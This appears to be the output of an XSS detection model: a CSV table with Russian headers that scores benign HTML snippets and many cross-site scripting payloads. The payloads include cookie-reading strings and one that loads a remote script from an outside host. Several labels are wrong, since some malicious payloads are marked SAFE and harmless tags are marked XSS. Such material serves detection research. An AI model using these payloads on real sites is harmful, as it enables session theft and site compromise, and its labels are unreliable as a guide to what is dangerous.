Входная строка;XSS;Вероятность;Риск
<h4>Login</h4>;False;27.98%;LOW
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<details/open/ontoggle=(confirm)()//;True;70.91%;HIGH
"'""><A HRef="" AutoFocus OnFocus=top/**/?.'ale'%2B'rt'>""";True;98.07%;CRITICAL
%20<script>prompt(document.domain)</script>;True;65.84%;HIGH
"xss:ex/*XSS*//*/*/pression(alert(""XSS""))'>";True;87.82%;CRITICAL
<a href='/page'>Contact</a>;False;1.05%;SAFE
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<div>Home</div>;False;25.75%;LOW
"%20<body onload=alert(""bingo"")>";True;99.36%;CRITICAL
<h2>Login</h2>;False;27.98%;LOW
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
"<a href=http://foo.bar/#x=`y></a><img alt=""`><img src=x:x onerror=javascript:alert(1)></a>"">";False;17.90%;SAFE
%3C%25%69%6D%67%20%73%72%63%3D%78%20%6F%6E%65%72%72%6F%72%3D%70%72%6F%6D%70%74%28%64%6F%63%75%6D%65%6E%74%2E%64%6F%6D%61%69%6E%29%3B%3E;True;71.89%;HIGH
<div>Home</div>;False;25.75%;LOW
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
"<img src=""non-existent-image.jpg"" onerror=""alert(document.cookie);"" />";True;98.21%;CRITICAL
<h2>Login</h2>;False;27.98%;LOW
${alert(1)};True;85.09%;CRITICAL
<h2>Login</h2>;False;27.98%;LOW
<audio controls ondurationchange=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>;True;99.71%;CRITICAL
"""><img src=x onerror=prompt(document.domain);String.fromCharCode(62);"">";True;84.06%;CRITICAL
"&quot;&gt;&lt;svg onload=alert&amp;#x27;&#x00000040&quot;1&quot;&gt;";True;99.18%;CRITICAL
/#<img src=1 onerror=javascript:confirm(3)>;True;87.45%;CRITICAL
{{_openBlock.constructor('alert(1)')()}};True;87.09%;CRITICAL
"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()>";True;38.19%;LOW
"<img onerror=eval('al&#x5c;u0065rt(1)') src=a>";True;91.30%;CRITICAL
"""><svg%20onload=alert%26%230000000040""1"")>";True;99.23%;CRITICAL
<svg onx=() onload=window.alert?.()> (working);True;99.68%;CRITICAL
<footer id=x tabindex=1 onfocus=alert(1)></footer>;True;99.86%;CRITICAL
<div>Home</div>;False;25.75%;LOW
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<a href='/page'>Contact</a>;False;1.05%;SAFE
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
"""><svg+onload=alert&amp;#x30""1";True;99.49%;CRITICAL
"'>  <script>alert(2);</script>";True;93.29%;CRITICAL
"""><svg+onload=alert&amp;#x62""1";True;99.49%;CRITICAL
"""/><script>+-+-1-+-+confirm(1)</script>";True;61.02%;HIGH
"& lt;script&gt;alert(2);& lt;/script&gt;";True;92.34%;CRITICAL
<input type='text' name='field'>;False;29.42%;LOW
<a href='/page'>Contact</a>;False;1.05%;SAFE
test+(<script>alert(0)</script>)@gmail.com;True;82.88%;CRITICAL
javascript:\\\\\\\\\\\\\\\/\\\\\\\\\\\\\\\/%250Aalert(1);True;92.98%;CRITICAL
"""*alert(1)*""";True;93.47%;CRITICAL
<h2>Login</h2>;False;27.98%;LOW
"""><svg onload=prompt(document.domain);>.aspx";True;85.76%;CRITICAL
<span class='class-1444'>Services</span>;False;1.13%;SAFE
"<a href=""\x0Bjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>";False;3.46%;SAFE
"<IMG SRC=""('XSS')""";True;86.10%;CRITICAL
<span class='class-1114'>Services</span>;False;1.13%;SAFE
<span class='class-994'>Services</span>;False;1.13%;SAFE
"<s\Cr\ipt\>alert(document\.cookie)<\/s\Cr\ipt\>\;\/>";True;71.88%;HIGH
<h2>Login</h2>;False;27.98%;LOW
%20<script>alert(1)</script>;True;85.30%;CRITICAL
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<p>About</p>;False;34.33%;LOW
<svg/on%20onload=alert(1)> (working) -@aufzayed;True;98.98%;CRITICAL
<img src='image.jpg' alt='image'>;False;34.81%;LOW
"""><img src=1 onerror=alert&#x000000028;1&#x000000029;&#x00000003B;"">";True;99.48%;CRITICAL
<div>Home</div>;False;25.75%;LOW
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
"""><body/oNpagEshoW=(confirm)(document.domain)>";True;83.18%;CRITICAL
<script>with(document)alert(cookie)</script>;True;80.20%;CRITICAL
<img/ src//'onerror/''/=confirm(1)//'>;False;23.95%;LOW
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<h2>Login</h2>;False;27.98%;LOW
<button>Read more</button>;False;28.28%;LOW
<button>Read more</button>;False;28.28%;LOW
%EF%BC%9Cimg%20src%3Dxxx%20onerror%3Dalert(1)%EF%BC%9E;True;81.08%;CRITICAL
?url=%26%2302java%26%23115cript:alert(document.domain);True;80.81%;CRITICAL
><script>alert(123)</script>;True;86.08%;CRITICAL
<script>location=name</script>;True;52.58%;MEDIUM
<h6>Login</h6>;False;27.98%;LOW
'><script>alert(123)</script>;True;92.27%;CRITICAL
<--`<img/src=` onerror=confirm(1)> --!>;True;81.82%;CRITICAL
<a href='/page'>Contact</a>;False;1.05%;SAFE
<div>Home</div>;False;25.75%;LOW
<p>About</p>;False;34.33%;LOW
<input type='text' name='field'>;False;29.42%;LOW
<h2>Login</h2>;False;27.98%;LOW
%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E;True;92.25%;CRITICAL
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<img src='image.jpg' alt='image'>;False;34.81%;LOW
"<a href=""&#x6a;avascript:alert(1)"">XSS</a>";False;3.59%;SAFE
<span class='class-1334'>Services</span>;False;1.13%;SAFE
<image src =q onerror=prompt(8)>;True;84.45%;CRITICAL
<div>Home</div>;False;25.75%;LOW
"'><!--""/><style>@import 'data:text/css;base64,YWxlcnQoZG9jdW1lbnQuY29va2llKSk=';</style><b><!--";True;95.47%;CRITICAL
<div>Home</div>;False;25.75%;LOW
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<div>Home</div>;False;25.75%;LOW
'-setTimeout`prompt\u0028document.domain\u0029`-';True;90.71%;CRITICAL
<div>Home</div>;False;25.75%;LOW
'%3e%3cscript%3ealert(5*5)%3c%2fscript%3eejj4sbx5w4o;True;91.14%;CRITICAL
"""><svg+onload=alert&amp;#x97""1";True;99.49%;CRITICAL
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
"""<body/onload=&lt;!--&gt;&#10confirm(1);prompt(/XSS/.source)>""";True;88.30%;CRITICAL
<div>Home</div>;False;25.75%;LOW
javascript:\/\/%250Aalert(1);True;95.55%;CRITICAL
<Svg On Only=1 Onload=alert(1)>;True;96.26%;CRITICAL
<p>About</p>;False;34.33%;LOW
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<div>Home</div>;False;25.75%;LOW
<p>About</p>;False;34.33%;LOW
<div>Home</div>;False;25.75%;LOW
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<iframe/onreadystatechange=alert(1);True;99.02%;CRITICAL
<hgroup onfocus=alert(1) autofocus tabindex=1>;True;99.67%;CRITICAL
"<img onerror=a&#x06c;ert(1) src=a>";True;88.04%;CRITICAL
mitsecXSS%22%3E%3Cinput%20%00%20onControl%20hello%20oninput=confirm(1)%20x%3E;True;81.79%;CRITICAL
"<svg onload=""confirm(7)"">";True;84.52%;CRITICAL
"""><svg+onload=alert&amp;#x78""1";True;99.49%;CRITICAL
onfocus=â€alert(â€˜XSSâ€™);True;99.39%;CRITICAL
"<STYLE>li+{list-style-image:url(""javascript:alert(1)"");}</STYLE><UL><LI>1";True;89.72%;CRITICAL
<span class='class-1064'>Services</span>;False;1.13%;SAFE
"""+style%3d""x%3aexpression(alert(1))+";True;87.69%;CRITICAL
<isindex action=javascript:alert(1) type=image>;True;91.52%;CRITICAL
<h6>Login</h6>;False;27.98%;LOW
%253C%2531%2533%2533%253E%253C%2539%253E%253C%2569%253D%2538%253B%253E%253C%253F%256A%2532%253E%253C%252F%2563%253E%253C%252F%2573%2563%2568%2572%2569%2570%2574%253E;True;74.42%;HIGH
Â¼scriptÂ¾alert(Â¢XSSÂ¢)Â¼/scriptÂ¾;True;92.45%;CRITICAL
"""&amp;amp;amp;amp;lt;img src=1 onerror=alert(1)&amp;amp;amp;amp;gt;";True;99.70%;CRITICAL
<span class='class-284'>Services</span>;False;1.13%;SAFE
<p>About</p>;False;34.33%;LOW
"Search/Results?q=""><img src=x onerror=prompt(document.domain);>";True;97.57%;CRITICAL
<h6>Login</h6>;False;27.98%;LOW
<input type='text' name='field'>;False;29.42%;LOW
<input type='text' name='field'>;False;29.42%;LOW
"<IFRAME SRC=""javascript:alert(document.cookie);""></IFRAME>";True;84.94%;CRITICAL
<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/;False;25.86%;LOW
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
%26amp%3Blt%3Bscript%26amp%3Bgt%3Balert%281%29%26amp%3Blt%3B%2Fscript%26amp%3Bgt%3B;True;84.73%;CRITICAL
<h4>Login</h4>;False;27.98%;LOW
<button>Read more</button>;False;28.28%;LOW
"'; x=eval; </script> <svg onpointerenter=alert()%20z= alert >";True;99.86%;CRITICAL
<div>Home</div>;False;25.75%;LOW
<p>About</p>;False;34.33%;LOW
<div>Home</div>;False;25.75%;LOW
"""><svg+onload=alert&amp;#x60""1";True;99.49%;CRITICAL
"""><svg+onload=alert&amp;#x27""1";True;99.49%;CRITICAL
https://twitter.com/xhzeem/status/1378316651431612422;True;57.72%;MEDIUM
"""><svg+onload=alert&amp;#x2F""1";True;99.49%;CRITICAL
<sc<script>ript>alert(123)</sc</script>ript>;True;87.10%;CRITICAL
"&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;";True;90.86%;CRITICAL
6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/;True;72.15%;HIGH
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
"<iframe srcdoc=""<script>alert(1)</script>""></iframe>";True;94.43%;CRITICAL
<p>About</p>;False;34.33%;LOW
<x :[_b.constructor`alert(1)`()]>;True;60.10%;HIGH
<form id=x tabindex=1 onfocus=alert(1)></form>;True;99.88%;CRITICAL
"""><svg+onload=alert&amp;#x7A""1";True;99.49%;CRITICAL
"'""><A HRef=\"" AutoFocus OnFocus=top/**/?.['ale'%2B'rt'](document%2Bcookie)>";True;94.12%;CRITICAL
"""><svg+onload=alert&amp;#x57""1";True;99.49%;CRITICAL
<div>Home</div>;False;25.75%;LOW
"""><svg+onload=alert&amp;#x7F""1";True;99.49%;CRITICAL
"""><input autofocus onfocus =top[(584390752*16).toString(32-1*2)](/XSS/)>";True;91.58%;CRITICAL
"""><svg onload=prompt(document.domain);>";True;83.34%;CRITICAL
"<script>a\u006cert(1);</script>";True;68.52%;HIGH
<button>Read more</button>;False;28.28%;LOW
<p>About</p>;False;34.33%;LOW
<a href='/page'>Contact</a>;False;1.05%;SAFE
"""autofocus/onfocus=alert(1)//";True;99.12%;CRITICAL
"<A HREF=""http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D"">XSS</A>";True;90.70%;CRITICAL
</scrip</script>t><img src =q onerror=prompt(8)>;True;91.97%;CRITICAL
"""><img src=data:, onerror=prompt(document.domain);>";True;82.49%;CRITICAL
"<a href=""javascript&#0000058&#0000097lert('Successful XSS')"">Click this link!</a>";False;0.31%;SAFE
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<body onload=alert(â€œbingoâ€)>;True;99.74%;CRITICAL
"&amp;amp;amp;lt;script&amp;amp;amp;gt;alert(1)&amp;amp;amp;lt;/script&amp;amp;amp;gt;";True;87.19%;CRITICAL
<script x>alert('XSS')<script y>;True;65.46%;HIGH
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
%20%3Cimg%20src=1%20onerror=alert(1)%3E;True;99.25%;CRITICAL
"\""><img src=x onerror=prompt(document.domain);>";True;82.49%;CRITICAL
%EF%BC%9Cscript%EF%BC%9E alert() %EF%BC%9C/script%EF%BC%9E;True;90.32%;CRITICAL
""";eval(unescape(location))//# %0Aalert(0)";True;86.04%;CRITICAL
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
"""><svg+onload=alert&amp;#x82""1";True;99.49%;CRITICAL
<h2>Login</h2>;False;27.98%;LOW
<img onerror=a&#0108ert(1) src=a>;True;84.25%;CRITICAL
"(Z(""onerror=""a=print,a`1`""))";True;82.57%;CRITICAL
"""/><iMg SrC=""x"" oNeRRor=""alert(document.cookie);"">";True;97.23%;CRITICAL
"""><svg+onload=alert&amp;#x93""1";True;99.49%;CRITICAL
"""><svg+onload=alert&amp;#x89""1";True;99.49%;CRITICAL
">'""><script>alert(2);</script>";True;94.70%;CRITICAL
<body onpopstate=print()>;True;73.78%;HIGH
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
"'a'.constructor.prototype.charAt=[].join;[1]|orderBy:'x=1} } };alert(1)//';";True;74.08%;HIGH
<h4>Login</h4>;False;27.98%;LOW
<a href='/page'>Contact</a>;False;1.05%;SAFE
<h2>Login</h2>;False;27.98%;LOW
"""&amp;amp;amp;gt;&amp;amp;amp;lt;svg onload=alert(1)&amp;amp;amp;gt;";True;99.42%;CRITICAL
<span class='class-304'>Services</span>;False;1.13%;SAFE
"""><svg+onload=alert&amp;#x72""1";True;99.49%;CRITICAL
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<h6>Login</h6>;False;27.98%;LOW
Login.aspx?username=<img/src/onerror=alert(test)>;True;99.15%;CRITICAL
<iframe/src \/\/onload = prompt(1);True;69.21%;HIGH
<a href='/page'>Contact</a>;False;1.05%;SAFE
"<input type=""text"" value=""javascript:alert('XSS')"">";True;86.93%;CRITICAL
12&<script>alert(123)</script>=123;True;85.70%;CRITICAL
<div>Home</div>;False;25.75%;LOW
<a href='/page'>Contact</a>;False;1.05%;SAFE
"<IMG SRC=/ onerror=""alert(String.fromCharCode(88,83,83))""></img>";True;99.61%;CRITICAL
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<input type='text' name='field'>;False;29.42%;LOW
"';document.addEventListener('DOMContentLoaded', function(){var c = function(){a();};var s = document.createElement('script');s.src = 'https://n.0x7359.com/xss.js';s.onreadystatechange = c;document.body.appendChild(s);});//";True;93.63%;CRITICAL
<h2>Login</h2>;False;27.98%;LOW
<img src='image.jpg' alt='image'>;False;34.81%;LOW
"â€œautofocus onclick=â€™&#97;lert()â€™";True;99.20%;CRITICAL
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
"&lt;script&gt;alert('XSS')&lt;/script&gt;";True;93.00%;CRITICAL
<p>About</p>;False;34.33%;LOW
<button>Read more</button>;False;28.28%;LOW
%2522%253E%253Cimg%2520src%253Dx%2520onerror%253Dprompt%2528document.cookie%2529%253B%253E;True;83.68%;CRITICAL
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<h6>Login</h6>;False;27.98%;LOW
<button>Read more</button>;False;28.28%;LOW
<p>About</p>;False;34.33%;LOW
"""<script>1-confirm(0);</script>""/>";True;66.43%;HIGH
"<IFRAME SRC=""javascript:alert(document.cookie);""></iframe>'";True;81.82%;CRITICAL
<script>alert(1)</script>;True;86.08%;CRITICAL
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
jAvaScripT:(alert)`1`;True;95.57%;CRITICAL
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
"javascript://</title></style></textarea>--></script><a""//' onclick=alert()//>*/alert()/*";True;99.09%;CRITICAL
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
"`'"";//><img/src=x onError=""${x};alert(`1`);"">";True;99.61%;CRITICAL
<div>Home</div>;False;25.75%;LOW
<p>About</p>;False;34.33%;LOW
<h6>Login</h6>;False;27.98%;LOW
<p>About</p>;False;34.33%;LOW
"<XSS STYLE=""xss:expression(alert('XSS'))"">";True;71.94%;HIGH
<p>About</p>;False;34.33%;LOW
<h6>Login</h6>;False;27.98%;LOW
<span class='class-244'>Services</span>;False;1.13%;SAFE
<p>About</p>;False;34.33%;LOW
"\"";alert('XSS');//";True;94.48%;CRITICAL
"<img onerror=a&#x006c;ert(1) src=a>";True;88.04%;CRITICAL
">'""><img src=x onerror=script(2);>";True;89.02%;CRITICAL
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
"""><svg onload=prompt(document.domain);>.asp";True;82.49%;CRITICAL
<img src='image.jpg' alt='image'>;False;34.81%;LOW
"""><svg+onload=alert&amp;#x28""1";True;99.49%;CRITICAL
"""><svg+onload=alert&amp;#x0E""1";True;99.49%;CRITICAL
<a href='/page'>Contact</a>;False;1.05%;SAFE
%uff3c%uff73%uff6cr%uff69%uff63%uff74%uffe0alert('XSS')%uff3e;True;74.26%;HIGH
<button>Read more</button>;False;28.28%;LOW
<script>alert(1)</script>.html;True;85.30%;CRITICAL
<img src='image.jpg' alt='image'>;False;34.81%;LOW
"<img onerror=a&#108;ert(1) src=a>";True;85.54%;CRITICAL
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
"%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%BCscript%E5%98%BEalert(1);%E5%98%BC/script%E5%98%BE";True;82.77%;CRITICAL
<img src=â€invalid-imageâ€ onerror=â€alert(document.cookie)â€>;True;99.36%;CRITICAL
<input type='text' name='field'>;False;29.42%;LOW
"""><svg+onload=alert&amp;#x55""1";True;99.49%;CRITICAL
<img src='image.jpg' alt='image'>;False;34.81%;LOW
%3Cimg%20src=xx%20onerror=alert(1)%3E;True;99.40%;CRITICAL
"onerror=""alert('XSS')""";True;99.39%;CRITICAL
<div>Home</div>;False;25.75%;LOW
<span class='class-64'>Services</span>;False;1.21%;SAFE
"-->""""/></script><deTailS open x="">"" ontoggle=(co\u006efirm)``>";True;97.75%;CRITICAL
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<span class='class-1304'>Services</span>;False;1.13%;SAFE
<xss onbeforescriptexecute=alert(1)><script>1</script>;True;99.79%;CRITICAL
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<img src='image.jpg' alt='image'>;False;34.81%;LOW
"<img src=""x"" onerror=""alert(1)"">";True;99.79%;CRITICAL
javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.domain;True;93.21%;CRITICAL
<d3v/onauxclick=(((confirm)))``>click;True;72.63%;HIGH
"""><img src=x onerror=prompt(document['domain']);>";True;80.54%;CRITICAL
< / script >< script >alert(123)< / script >;False;22.77%;LOW
<h6>Login</h6>;False;27.98%;LOW
"<script>eval(â€˜a\154ert(1)â€™);</script>";True;84.63%;CRITICAL
<Img Src=OnXSS OnError=confirm(1)>;True;70.50%;HIGH
<div>Home</div>;False;25.75%;LOW
"%22%3E'><script>alert(2);</script>";True;88.53%;CRITICAL
"x""><svg%0Donload=`window[""alert""](((document)['cookie']))`>";True;96.29%;CRITICAL
src=JaVaSCript:prompt(132);True;83.35%;CRITICAL
"<iframe src-doc=""<svg onload=alert (1337)&nvgt;""></iframe>";True;99.87%;CRITICAL
"%22%27%3E'><script>alert(2);</script>";True;88.53%;CRITICAL
<a href='/page'>Contact</a>;False;1.05%;SAFE
"å˜¾å˜¾<script>alert(2);</script>";True;85.70%;CRITICAL
"&#x3C;img src=1 onerror=alert(1)&#x3E;";True;99.61%;CRITICAL
"xss'''><iframe srcdoc='%26it;script>;prompt` ${document.domain}`%26it;/script>'>";True;47.03%;MEDIUM
"<BGSOUND SRC=""javascript:alert('XSS');"">";True;89.88%;CRITICAL
"""><svg+onload=alert&amp;#x58""1";True;99.49%;CRITICAL
onclick=â€alert(â€˜XSSâ€™);True;99.39%;CRITICAL
"""onclick=prompt(8)>""@x.y";True;76.59%;HIGH
<span class='class-344'>Services</span>;False;1.13%;SAFE
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<p>About</p>;False;34.33%;LOW
"%E5%98%8D%E5%98%8A%20<body onload=alert(""bingo"")>";True;98.92%;CRITICAL
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<div>Home</div>;False;25.75%;LOW
"<IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>"">";True;98.92%;CRITICAL
<div>Home</div>;False;25.75%;LOW
"</script><svg onload='-/""/-confirm(1)//'""";True;90.98%;CRITICAL
"javascript:var img=document.createElement('img');img.src='';document.body.appendChild(img);img.onerror=alert(1)";True;96.93%;CRITICAL
"xxxxxxxxx'});});</script><script>prompt(""PLEASE%20\nSUBSCRIBE"")</script>";True;72.05%;HIGH
<p>About</p>;False;34.33%;LOW
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
%3Csvg%2Fonload%3Dalert%28%22XSS%22%29%20%3E;True;84.02%;CRITICAL
"<STYLE>.XSS{background-image:url(""javascript:alert('XSS')"");}</STYLE><A CLASS=XSS></A>";True;84.20%;CRITICAL
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
"""\""><img src=\""x\"" onerror=\""confirm(0)\""/>"",";True;75.35%;HIGH
<div>Home</div>;False;25.75%;LOW
"<BODY BACKGROUND=""javascript:alert('XSS')"">";True;98.78%;CRITICAL
<p>About</p>;False;34.33%;LOW
""";alert(String.fromCharCode(88,83,83))";True;86.90%;CRITICAL
"javascript://--></title></style></textarea></script><svg ""//' onclick=alert()//";True;99.17%;CRITICAL
"""></SCRIPT>â€>â€™><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>";True;82.94%;CRITICAL
%3Cscript%0Caaaaa%3Ealert%28123%29%3C/script%0Caaaaa%3E;True;92.13%;CRITICAL
"<STYLE>li+{list-style-image:url(""javascript:alert(1)"");}</STYLE><UL><LI>";True;89.84%;CRITICAL
"';alert(123);t='";True;94.51%;CRITICAL
<input type='text' name='field'>;False;29.42%;LOW
"<form><a href=""javascript:\u0061lert(1)"">X";True;96.30%;CRITICAL
<span class='class-164'>Services</span>;False;1.13%;SAFE
"jaVasCript:\/*-\/*`\/*\\`\/*\'\/*\""\/**\/(\/* *\/oNcliCk=alert() )\/\/%0D%0A%0D%0A\/\/<\/stYle\/<\/titLe\/<\/teXtarEa\/<\/scRipt\/--!>\\x3csVg\/<sVg\/oNloAd=alert()\/\/>\\x3e";True;98.61%;CRITICAL
<button>Read more</button>;False;28.28%;LOW
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<form onfocus=alert(1) autofocus tabindex=1>;True;99.68%;CRITICAL
"java%0d%0ascript%0d%0a:alert(document.domain);//";True;95.33%;CRITICAL
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
"""><svg+onload=alert&amp;#x41""1";True;99.49%;CRITICAL
<span class='class-944'>Services</span>;False;1.13%;SAFE
<p>About</p>;False;34.33%;LOW
